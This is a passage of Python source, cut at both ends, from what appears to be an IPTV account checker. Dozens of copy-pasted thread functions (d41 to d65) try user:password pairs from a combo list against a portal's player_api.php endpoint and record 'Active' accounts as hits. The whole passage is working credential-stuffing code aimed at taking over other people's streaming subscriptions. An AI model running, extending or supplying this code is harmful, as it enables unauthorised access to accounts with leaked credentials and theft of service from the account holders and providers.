            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d41():
    global hit
    say = 0
    for fyz in range(41, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_41'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d42():
    global hit
    say = 0
    for fyz in range(42, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_42'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d43():
    global hit
    say = 0
    for fyz in range(43, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_43'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d44():
    global hit
    say = 0
    for fyz in range(44, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_44'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d45():
    global hit
    say = 0
    for fyz in range(45, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_45'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d46():
    global hit
    say = 0
    for fyz in range(46, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_46'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d47():
    global hit
    say = 0
    for fyz in range(47, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_47'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d48():
    global hit
    say = 0
    for fyz in range(48, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_48'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d49():
    global hit
    say = 0
    for fyz in range(49, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_49'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d50():
    global hit
    say = 0
    for fyz in range(50, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_50'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d51():
    global hit
    say = 0
    for fyz in range(51, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_51'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d52():
    global hit
    say = 0
    for fyz in range(52, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_52'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d53():
    global hit
    say = 0
    for fyz in range(53, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_53'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d54():
    global hit
    say = 0
    for fyz in range(54, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_54'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d55():
    global hit
    say = 0
    for fyz in range(55, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_55'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d56():
    global hit
    say = 0
    for fyz in range(56, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_56'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d57():
    global hit
    say = 0
    for fyz in range(57, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_57'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d58():
    global hit
    say = 0
    for fyz in range(58, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_58'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d59():
    global hit
    say = 0
    for fyz in range(59, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_59'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d60():
    global hit
    say = 0
    for fyz in range(60, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_60'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d61():
    global hit
    say = 0
    for fyz in range(61, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_61'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d62():
    global hit
    say = 0
    for fyz in range(62, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_62'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d63():
    global hit
    say = 0
    for fyz in range(63, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_63'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d64():
    global hit
    say = 0
    for fyz in range(64, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_64'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d65():
    global hit
    say = 0
    for fyz in range(65, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_65'
